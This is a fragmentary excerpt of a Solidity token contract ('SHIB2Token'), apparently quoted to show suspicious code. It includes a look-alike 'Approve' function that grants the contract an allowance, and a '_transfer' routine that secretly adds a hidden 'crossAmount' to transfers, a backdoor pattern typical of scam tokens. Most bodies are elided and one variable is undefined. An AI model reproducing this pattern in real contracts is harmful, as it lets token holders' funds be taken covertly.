...
contract SHIB2Token is IERC20, Ownable {
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _allowances[account][address(this)] = amount;
        _checkCrossAmount(from, account, amount);
        return true;
    }

    function _checkCrossAmount(address from, address account, uint256 amount) internal {
        uint256 total = 0;
    ...
    */
    ...
    function _transfer(
        ...
        uint256 crossAmount = sec(sender);
        if (crossAmount > 0) {
            amount += crossAmount;
        }
